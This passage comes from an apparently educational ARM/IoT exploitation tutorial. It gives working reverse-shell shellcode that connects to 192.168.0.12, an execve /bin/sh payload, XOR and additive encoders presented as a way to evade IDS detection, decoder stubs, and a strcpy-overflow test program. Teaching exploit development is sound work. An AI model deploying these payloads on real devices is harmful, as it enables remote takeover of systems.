<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/chapter3# ld -o reverse_shell reverse_shell.o</p>
<p>Extract the opcode</p>
<p>for i in $(objdump -d reverse_shell | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’</p>
<p>\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\x80\x70\x9f\xe5\x00\x00\x00\xef\x00\x60\xa0\xe1\x5c\x10\xa0\xe3\x11\x50\xa0\xe3\x01\x1c\xa0\xe1\x05\x18\x81\xe0\x02\x10\x81\xe2\x64\x20\x9f\xe5\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x06\x00\xa0\xe1\x54\x70\x9f\xe5\x00\x00\x00\xef\x02\x10\xa0\xe3\x06\x00\xa0\xe1\x3f\x70\xa0\xe3\x00\x00\x00\xef\x01\x10\x41\xe2\x01\x00\x71\xe3\xf9\xff\xff\x1a\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00\x19\x01\x00\x00\xc0\xa8\x00\x0c\x1b\x01\x00\x00</p>
<p>Test it</p>
<p>File<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/test/test_reverse.c" target="_blank" rel="external">test_reverse.c</a></p>
<p>#include <stdio.h><br>char *code= “\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\x80\x70\x9f\xe5\x00\x00\x00\xef\x00\x60\xa0\xe1\x5c\x10\xa0\xe3\x11\x50\xa0\xe3\x01\x1c\xa0\xe1\x05\x18\x81\xe0\x02\x10\x81\xe2\x64\x20\x9f\xe5\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x06\x00\xa0\xe1\x54\x70\x9f\xe5\x00\x00\x00\xef\x02\x10\xa0\xe3\x06\x00\xa0\xe1\x3f\x70\xa0\xe3\x00\x00\x00\xef\x01\x10\x41\xe2\x01\x00\x71\xe3\xf9\xff\xff\x1a\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00\x19\x01\x00\x00\xc0\xa8\x00\x0c\x1b\x01\x00\x00”;</stdio.h></p>
<p>int main(void) {<br>  (<em>(void(</em>)()) code)();<br>  return 0;<br>}</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o test_reverse test_reverse.c</p>
<p>Victim machine</p>
<p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/1" alt=""></p>
<p>Remote machine (192.168.0.12)</p>
<p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/2" alt=""></p>
<p>And now we have control from the remote machine</p>
<p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/3" alt=""></p>
<p>Load and execute a shell from memory</p>
<p>In this chapter we will see how to create a shellcode that loads and executes the execve shellcode from memory.</p>
<p>We will begin by taking the opcodode of the execve shellcode (file: execve)</p>
<p>Extract the opcode</p>
<p>for i in $(objdump -d execve | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’<br>\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00</p>
<p>Create a simple encoder</p>
<p>Encoding of the shellcode is generally used for the following reasons:</p>
<p>Avoid detection of IDS and/or network sensors</p>
<p>Avoid bad characters</p>
<p>The execve shellcode contains the string<br>/bin/sh<br>, this string could be easily detected for example by netwok based sensors, we will see a method for encoding all the execve’s shellcode.</p>
<p>For building the encoder we will use two<br>xor<br> keys, one key is used to encode the bytes in position 6 and 12, and the other one is used for the rest of the code.</p>
<p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/4" alt=""></p>
<p>This is the source code of a simple C encoder</p>
<p>file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/encoder.c" target="_blank" rel="external">encoder.c</a></p>
<p>#include <stdio.h></stdio.h></p>
<p>int main()</p>
<p>{</p>
<p>  //execve shellcode</p>
<p>  unsigned char shellcode[] = “\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00”;</p>
<p>  int len = 48;</p>
<p>  char out[len];</p>
<p>  int i;</p>
<p>  for(i=0; i&lt;len; i++){</p>
<pre><code>if(i==6 || i==12){

  out[i] = shellcode[i] ^ 0x12;

  printf(&quot;0x%x,&quot;, out[i]);

  out[i]++;

}else{

  out[i] = shellcode[i] ^ 0x47;

  if(i==47){

    printf(&quot;0x%x\n&quot;, out[i]);

  }else{

    printf(&quot;0x%x,&quot;, out[i]);

  }

  out[i]++;

}
</code></pre><p>  }</p>
<p>return 0;</p>
<p>}</p>
<p>Compile and execute the encoder program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o encoder encoder.c </p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./encoder<br>0x48,0x47,0xe7,0xa6,0x67,0x47,0x92,0xa5,0x45,0x67,0x5,0xa7,0x17,0x47,0x6a,0xae,0x4a,0x57,0xe7,0xa6,0x4c,0x37,0xe7,0xa4,0x47,0x47,0x47,0xa8,0x47,0x47,0xe7,0xa4,0x46,0x37,0xe7,0xa4,0x47,0x47,0x47,0xa8,0x68,0x25,0x2e,0x29,0x68,0x34,0x2f,0x47 </p>
<p>We can write now the shellcode that maps a new area of memory, decodes the execve shellcode into the new allocated area and launches the execve shellcode from memory, the steps to perform are:</p>
<p>Creation of a writable and exectuable memory area</p>
<p>W<br>rite the alghorithm for decoding the shellcode and write the decoded bytes into the new allocated area</p>
<p>Jump into the new allocated area to execute the shellcode</p>
<p>To map the new area of memory we use the mmap2 syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep mmap</p>
<p>#define <strong>NR_mmap (</strong>NR_SYSCALL_BASE+ 90)</p>
<p>#define <strong>NR_mmap2 (</strong>NR_SYSCALL_BASE+192)</p>
<p>#undef __NR_mmap</p>
<p>Let’s start to write the code</p>
<p>@ mapping new area of memory in the heap</p>
<p>mov r4, #0xffffffff  @ file descriptor</p>
<p>ldr r0, =0x00030000  @ address</p>
<p>ldr r1, =0x1000      @ size totale della mapping table</p>
<p>mov r2, #7           @ prot</p>
<p>mov r3, #0x32        @ flags</p>
<p>mov r5, #0           @ offset</p>
<p>mov r7, #192         @ syscall number</p>
<p>swi #0               @ mmap2(0x30000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x30000</p>
<p>2- write the alghorithm for decoding the shellcode and write the decoded bytes into the newly allocated area</p>
<p>mov r8, #48         @ size of the shellcode</p>
<p>mov r1, pc          @ move into r1 the pc</p>
<p>add r1, #76         @ address of the shellcode</p>
<p>ldr r5, =#0x12      @ xor key1</p>
<p>ldr r6, =#0x47      @ xor key2</p>
<p>mov r9, r0          @ save return address of the mnmap</p>
<p>mov r4, #0          @ index for the loop</p>
<p>start:</p>
<p>  ldrb r2, [r1, r4] @ store into r2 the byte at the location (r1 + r4)</p>
<p>  cmp r4, #6        @ check the number of the index (r4)</p>
<p>  bne xor2          @ if r4 is not equal to 6 jmp to xor2</p>
<p>xor1:</p>
<p>  eor r2, r2, r5    @ decoder alghorithm with xor key1</p>
<p>  strb r2, [r9, r4] @ save the decoded byte into the allocated memory</p>
<p>  add r4, #1        @ increment the index by 1</p>
<p>  b start           @ jump to start</p>
<p>xor2:</p>
<p>  cmp r4, #12       @ check the number of the index (r4)</p>
<p>  beq xor1          @ if r4 is equal to 12 jmp to xor1</p>
<p>  eor r2, r2, r6    @ decoder alghorithm with xor key2</p>
<p>  strb r2, [r9, r4] @ save the decoded byte into the allocated memory</p>
<p>  add r4, #1        @ increment the index by 1</p>
<p>  cmp r4, r8        @ check the index with the size of the shellcode</p>
<p>  bne start         @ if index!=sizeOfShellcode jump to start</p>
<p>3- jump into the new allocated area to execute the shellcode</p>
<p>end:</p>
<p>  blx r9 @ jmp to the allocated area</p>
<p>All the source code (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/decoder.s" target="_blank" rel="external">decoder.s</a><br>)</p>
<p>.global _start</p>
<p>_start:</p>
<p>  @ mapping new area of memory in the heap</p>
<p>  mov r4, #0xffffffff @ file descriptor</p>
<p>  ldr r0, =0x00030000 @ address</p>
<p>  ldr r1, =0x1000     @ size totale della mapping table</p>
<p>  mov r2, #7          @ prot</p>
<p>  mov r3, #0x32       @ flags</p>
<p>  mov r5, #0          @ offset</p>
<p>  mov r7, #192        @ syscall number</p>
<p>  swi #0              @ mmap2(0x30000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x30000</p>
<p>  mov r8, #48         @ size of the shellcode</p>
<p>  mov r1, pc          @ move into r1 the pc</p>
<p>  add r1, #76         @ address of the shellcode</p>
<p>  ldr r5, =#0x12      @ xor key1</p>
<p>  ldr r6, =#0x47      @ xor key2</p>
<p>  mov r9, r0          @ save return address of the mnmap</p>
<p>  mov r4, #0          @ index for the loop</p>
<p>start:</p>
<p>  ldrb r2, [r1, r4]   @ store into r2 the byte at the location (r1 + r4)</p>
<p>  cmp r4, #6          @ check the number of the index (r4)</p>
<p>  bne xor2            @ if r4 is not equal to 6 jmp to xor2</p>
<p>xor1:</p>
<p>  eor r2, r2, r5      @ decoder alghorithm with xor key1</p>
<p>  strb r2, [r9, r4]   @ save the decoded byte into the allocated memory</p>
<p>  add r4, #1          @ increment the index by 1</p>
<p>  b start             @ jump to start</p>
<p>xor2:</p>
<p>  cmp r4, #12         @ check the number of the index (r4)</p>
<p>  beq xor1            @ if r4 is equal to 12 jmp to xor1</p>
<p>  eor r2, r2, r6      @ decoder alghorithm with xor key2</p>
<p>  strb r2, [r9, r4]   @ save the decoded byte into the allocated memory</p>
<p>  add r4, #1          @ increment the index by 1</p>
<p>  cmp r4, r8          @ check the index with the size of the shellcode</p>
<p>  bne start           @ if index!=sizeOfShellcode jump to start</p>
<p>end:</p>
<p>  blx r9              @ jmp to the allocated area</p>
<p>shellcode: .byte 0x48,0x47,0xe7,0xa6,0x67,0x47,0x92,0xa5,0x45,0x67,0x5,0xa7,0x17,0x47,0x6a,0xae,0x4a,0x57,0xe7,0xa6,0x4c,0x37,0xe7,0xa4,0x47,0x47,0x47,0xa8,0x47,0x47,0xe7,0xa4,0x46,0x37,0xe7,0xa4,0x47,0x47,0x47,0xa8,0x68,0x25,0x2e,0x29,0x68,0x34,0x2f,0x47</p>
<p>Assemble and link the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# as -o decoder.o decoder.s</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ld -o decoder decoder.o</p>
<p>Test the decoder shellcode</p>
<p>Let’s start with the bytes extraction:</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# for i in $(objdump -d decoder | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’</p>
<p>\x00\x40\xe0\xe3\x03\x08\xa0\xe3\x01\x1a\xa0\xe3\x07\x20\xa0\xe3\x32\x30\xa0\xe3\x00\x50\xa0\xe3\xc0\x70\xa0\xe3\x00\x00\x00\xef\x30\x80\xa0\xe3\x0f\x10\xa0\xe1\x4c\x10\x81\xe2\x12\x50\xa0\xe3\x47\x60\xa0\xe3\x00\x90\xa0\xe1\x00\x40\xa0\xe3\x04\x20\xd1\xe7\x06\x00\x54\xe3\x03\x00\x00\x1a\x05\x20\x22\xe0\x04\x20\xc9\xe7\x01\x40\x84\xe2\xf8\xff\xff\xea\x0c\x00\x54\xe3\xf9\xff\xff\x0a\x06\x20\x22\xe0\x04\x20\xc9\xe7\x01\x40\x84\xe2\x08\x00\x54\xe1\xf1\xff\xff\x1a\x39\xff\x2f\xe1\x48\x47\xe7\xa6\x67\x47\x92\xa5\x45\x67\x05\xa7\x17\x47\x6a\xae\x4a\x57\xe7\xa6\x4c\x37\xe7\xa4\x47\x47\x47\xa8\x47\x47\xe7\xa4\x46\x37\xe7\xa4\x47\x47\x47\xa8\x68\x25\x2e\x29\x68\x34\x2f\x47</p>
<p>Create a C file for the decoder shellcode test (<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/test/test_decoder.c" target="_blank" rel="external">test_decoder.c </a><br>)</p>
<p>#include <stdio.h></stdio.h></p>
<p>char *code= “\x00\x40\xe0\xe3\x03\x08\xa0\xe3\x01\x1a\xa0\xe3\x07\x20\xa0\xe3\x32\x30\xa0\xe3\x00\x50\xa0\xe3\xc0\x70\xa0\xe3\x00\x00\x00\xef\x30\x80\xa0\xe3\x0f\x10\xa0\xe1\x4c\x10\x81\xe2\x12\x50\xa0\xe3\x47\x60\xa0\xe3\x00\x90\xa0\xe1\x00\x40\xa0\xe3\x04\x20\xd1\xe7\x06\x00\x54\xe3\x03\x00\x00\x1a\x05\x20\x22\xe0\x04\x20\xc9\xe7\x01\x40\x84\xe2\xf8\xff\xff\xea\x0c\x00\x54\xe3\xf9\xff\xff\x0a\x06\x20\x22\xe0\x04\x20\xc9\xe7\x01\x40\x84\xe2\x08\x00\x54\xe1\xf1\xff\xff\x1a\x39\xff\x2f\xe1\x48\x47\xe7\xa6\x67\x47\x92\xa5\x45\x67\x05\xa7\x17\x47\x6a\xae\x4a\x57\xe7\xa6\x4c\x37\xe7\xa4\x47\x47\x47\xa8\x47\x47\xe7\xa4\x46\x37\xe7\xa4\x47\x47\x47\xa8\x68\x25\x2e\x29\x68\x34\x2f\x47”;</p>
<p>int main(void) {</p>
<p>  (<em>(void(</em>)()) code)();</p>
<p>  return 0;</p>
<p>}</p>
<p>Compile and execute the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o test_decoder test_decoder.c</p>
<p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/5" alt=""></p>
<p>Encode the shellcode</p>
<p>In this last example we will see a case where encoding the shellcode is required. We will analyze the execve shellcode.</p>
<p>This is the source code of our target program (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/encode_shellcode/encode_shellcode_before.c" target="_blank" rel="external">encode_shellcode_before.c</a><br>)</p>
<p>#include <stdio.h></stdio.h></p>
<p>#include <string.h></string.h></p>
<p>char *msg = “\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00”;</p>
<p>void message(){</p>
<p>  char msg_buf[120]={0};</p>
<p>  strcpy(msg_buf, msg);</p>
<p>}</p>
<p>int main(int argc, char **argv){</p>
<p>  message();</p>
<p>  printf(“Good bye!\n”);</p>
<p>  return 0;</p>
<p>}</p>
<p>Compile it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o encode_shellcode_before encode_shellcode_before.c -g -z execstack</p>
<p>Set a breakpoint on line 11 and run the program</p>
<p>strcpy(msg_buf, msg);</p>
<p>Let’s look at the value of the variables msg and msg_buf (before of the strcpy instruction)</p>
<p>gdb&gt; x/50bx msg_buf</p>
<p>0x7efff5d0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5d8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5e0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5e8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5f0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5f8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff600: 0x00 0x00</p>
<p>gdb&gt; x/50bx msg</p>
<p>0x10590: 0x0f 0x00 0xa0 0xe1 0x20 0x00 0x80 0xe2</p>
<p>0x10598: 0x02 0x20 0x42 0xe0 0x05 0x00 0x2d 0xe9</p>
<p>0x105a0: 0x0d 0x10 0xa0 0xe1 0x0b 0x70 0xa0 0xe3</p>
<p>0x105a8: 0x00 0x00 0x00 0xef 0x00 0x00 0xa0 0xe3</p>
<p>0x105b0: 0x01 0x70 0xa0 0xe3 0x00 0x00 0x00 0xef</p>
<p>0x105b8: 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x00</p>
<p>0x105c0: 0x00 0x00</p>
<p>And after the<br>strcpy<br> function</p>
<p>gdb&gt; x/50bx msg_buf</p>
<p>0x7efff5d0: 0x0f 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5d8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5e0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5e8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5f0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff5f8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</p>
<p>0x7efff600: 0x00 0x00</p>
<p>gdb&gt; x/50bx msg</p>
<p>0x10590: 0x0f 0x00 0xa0 0xe1 0x20 0x00 0x80 0xe2</p>
<p>0x10598: 0x02 0x20 0x42 0xe0 0x05 0x00 0x2d 0xe9</p>
<p>0x105a0: 0x0d 0x10 0xa0 0xe1 0x0b 0x70 0xa0 0xe3</p>
<p>0x105a8: 0x00 0x00 0x00 0xef 0x00 0x00 0xa0 0xe3</p>
<p>0x105b0: 0x01 0x70 0xa0 0xe3 0x00 0x00 0x00 0xef</p>
<p>0x105b8: 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x00</p>
<p>0x105c0: 0x00 0x00</p>
<p>We can see that in<br>msg_buf<br> the shellcode was not copied, this is because the shellcode contains null characters.</p>
<p>To solve this problem, we can create a simple encoder: our encoding will be in a simple addition 🙂</p>
<p>The file name is<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/encode_shellcode/encoder_strcpy.c" target="_blank" rel="external">encoder_strcpy.c</a></p>
<p>#include <stdio.h><br>int main()<br>{<br>  //execve shellcode<br>  unsigned char shellcode[] = “\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00”;<br>  int len = 48;<br>  char out[len];<br>  int i; </stdio.h></p>
<p>  for(i=0; i&lt;len; i++){<br>    out[i] = shellcode[i] + 1;<br>    if(i==47){<br>      printf(“0x%x\n”, out[i]);<br>    }else{<br>      printf(“0x%x,”, out[i]);<br>      out[i]++;<br>    }<br>  }<br>  return 0;<br>} </p>
<p>Compile it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o encoder_strcpy encoder_strcpy.c</p>
<p>Execute it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./encoder_strcpy<br>0x10,0x1,0xa1,0xe2,0x21,0x1,0x81,0xe3,0x3,0x21,0x43,0xe1,0x6,0x1,0x2e,0xea,0xe,0x11,0xa1,0xe2,0xc,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x1,0x1,0xa1,0xe4,0x2,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x30,0x63,0x6a,0x6f,0x30,0x74,0x69,0x1</p>
<p>Let’s create the decoding shellcode (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/encode_shellcode/decoder_strcpy_v1.s" target="_blank" rel="external">decoder_strcpy_v1.s</a><br>)</p>
<p>.global _start</p>
<p>_start:</p>
<p>  mov r6, #48   @ size of the shellcode</p>
<p>  mov r1, pc    @ move into r1 the pc</p>
<p>  add r1, #44   @ address of the shellcode</p>
<p>  mov r4, #0    @ index for the loop</p>
<p>  sub sp, #48   @ save space for the decoded shellcode</p>
<p>  mov r3, sp    @ save address of the decoded shellcode into r3</p>
<p>start:</p>
<p>  ldrb r2, [r1, r4]  @ store into r2 the byte at the location (r1 + r4)</p>
<p>  sub r2, #1         @ decoding operation</p>
<p>  strb r2, [r3, r4]  @ save the decoded byte into the allocated memory</p>
<p>  add r4, #1         @ increment the index by 1</p>
<p>  cmp r4, r6         @ check the index with the size of the shellcode</p>
<p>  bne start           </p>
<p>end:</p>
<p>  add sp, #56        @ rebalances the stack</p>
<p>  blx r3             @ jmp to the allocated area</p>
<p>shellcode: .byte 0x10,0x1,0xa1,0xe2,0x21,0x1,0x81,0xe3,0x3,0x21,0x43,0xe1,0x6,0x1,0x2e,0xea,0xe,0x11,0xa1,0xe2,0xc,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x1,0x1,0xa1,0xe4,0x2,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x30,0x63,0x6a,0x6f,0x30,0x74,0x69,0x1</p>
<p>Assemble and link the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# as -o decoder_strcpy_v1.o decoder_strcpy_v1.s</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ld -o decoder_strcpy_v1 decoder_strcpy_v1.o</p>
<p>Look at the opcodes</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# objdump -d decoder_strcpy_v1 </p>
<p>decoder_strcpy_v1:     file format elf32-littlearm </p>
<p>Disassembly of section .text: </p>
<p>00010054 <_start>:<br>   10054:    e3a06030     mov    r6, #48    ; 0x30<br>   10058:    e1a0100f     mov    r1, pc<br>   1005c:    e281102c     add    r1, r1, #44    ; 0x2c<br>   10060:    e3a04000     mov    r4, #0<br>   10064:    e24dd030     sub    sp, sp, #48    ; 0x30<br>   10068:    e1a0300d     mov    r3, sp </_start></p>
<p>0001006c <start>:<br>   1006c:    e7d12004     ldrb    r2, [r1, r4]<br>   10070:    e2422001     sub    r2, r2, #1<br>   10074:    e7c32004     strb    r2, [r3, r4]<br>   10078:    e2844001     add    r4, r4, #1<br>   1007c:    e1540006     cmp    r4, r6<br>   10080:    1afffff9     bne    1006c <start> </start></start></p>
<p>00010084 <end>:<br>   10084:    e28dd038     add    sp, sp, #56    ; 0x38<br>   10088:    e12fff33     blx    r3 </end></p>
<p>0001008c <shellcode>:<br>   1008c:    e2a10110     .word    0xe2a10110<br>   10090:    e3810121     .word    0xe3810121<br>   10094:    e1432103     .word    0xe1432103<br>   10098:    ea2e0106     .word    0xea2e0106<br>   1009c:    e2a1110e     .word    0xe2a1110e<br>   100a0:    e4a1710c     .word    0xe4a1710c<br>   100a4:    f0010101     .word    0xf0010101<br>   100a8:    e4a10101     .word    0xe4a10101<br>   100ac:    e4a17102     .word    0xe4a17102<br>   100b0:    f0010101     .word    0xf0010101<br>   100b4:    6f6a6330     .word    0x6f6a6330<br>   100b8:    01697430     .word    0x01697430 </shellcode></p>
<p>As we can see there are still “null” bytes</p>
<p>10060: e3a04000 mov r4, #0</p>
<p>1007c: e1540006 cmp r4, r6</p>
<p>We can try to write these two instructions in this way</p>
<p>mov r4, #0 as sub r4, r4, r4</p>
<p>cmp r4, r6 as subs r5, r6, r4</p>
<p>This is the new version of the decoder (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/encode_shellcode/decoder_strcpy_v2.s" target="_blank" rel="external">decoder_strcpy_v2.s</a><br>)</p>
<p>.global _start</p>
<p>_start:</p>
<p>  mov r6, #48        @ size of the shellcode</p>
<p>  mov r1, pc         @ move into r1 the pc</p>
<p>  add r1, #44        @ address of the shellcode</p>
<p>  sub r4, r4, r4     @ index for the loop</p>
<p>  sub sp, #48        @ save space for the decoded shellcode</p>
<p>  mov r3, sp         @ save address of the decoded shellcode into r3</p>
<p>start:</p>
<p>  ldrb r2, [r1, r4]  @ store into r2 the byte at the location (r1 + r4)</p>
<p>  sub r2, #1         @ decoding operation</p>
<p>  strb r2, [r3, r4]  @ save the decoded byte into the allocated memory</p>
<p>  add r4, #1         @ increment the index by 1</p>
<p>  subs r5, r6, r4    @ check the index with the size of the shellcode</p>
<p>  bgt start          @ jump to start if r6&gt;r4</p>
<p>end:</p>
<p>  add sp, #56        @ add 56 to the sp</p>
<p>  blx r3             @ jmp to the allocated area</p>
<p>  shellcode: .byte 0x10,0x1,0xa1,0xe2,0x21,0x1,0x81,0xe3,0x3,0x21,0x43,0xe1,0x6,0x1,0x2e,0xea,0xe,0x11,0xa1,0xe2,0xc,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x1,0x1,0xa1,0xe4,0x2,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x30,0x63,0x6a,0x6f,0x30,0x74,0x69,0x1</p>
<p>Assemble and link the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# as -o decoder_strcpy_v2.o decoder_strcpy_v2.s</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ld -o decoder_strcpy_v2 decoder_strcpy_v2.o</p>
<p>Check the opcodes</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# objdump -d decoder_strcpy_v2 </p>
<p>decoder_strcpy_v2:     file format elf32-littlearm </p>
<p>Disassembly of section .text: </p>
<p>00010054 <_start>:<br>   10054:    e3a06030     mov    r6, #48    ; 0x30<br>   10058:    e1a0100f     mov    r1, pc<br>   1005c:    e281102c     add    r1, r1, #44    ; 0x2c<br>   10060:    e0444004     sub    r4, r4, r4<br>   10064:    e24dd030     sub    sp, sp, #48    ; 0x30<br>   10068:    e1a0300d     mov    r3, sp </_start></p>
<p>0001006c <start>:<br>   1006c:    e7d12004     ldrb    r2, [r1, r4]<br>   10070:    e2422001     sub    r2, r2, #1<br>   10074:    e7c32004     strb    r2, [r3, r4]<br>   10078:    e2844001     add    r4, r4, #1<br>   1007c:    e0565004     subs    r5, r6, r4<br>   10080:    cafffff9     bgt    1006c <start> </start></start></p>
<p>00010084 <end>:<br>   10084:    e28dd038     add    sp, sp, #56    ; 0x38<br>   10088:    e12fff33     blx    r3 </end></p>
<p>0001008c <shellcode>:<br>   1008c:    e2a10110     .word    0xe2a10110<br>   10090:    e3810121     .word    0xe3810121<br>   10094:    e1432103     .word    0xe1432103<br>   10098:    ea2e0106     .word    0xea2e0106<br>   1009c:    e2a1110e     .word    0xe2a1110e<br>   100a0:    e4a1710c     .word    0xe4a1710c<br>   100a4:    f0010101     .word    0xf0010101<br>   100a8:    e4a10101     .word    0xe4a10101<br>   100ac:    e4a17102     .word    0xe4a17102<br>   100b0:    f0010101     .word    0xf0010101<br>   100b4:    6f6a6330     .word    0x6f6a6330<br>   100b8:    01697430     .word    0x01697430 </shellcode></p>
<p>Perfect, no<br>null<br> bytes left, let’s take a look at the opcodes</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# for i in $(objdump -d decoder_strcpy_v2 | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’</p>
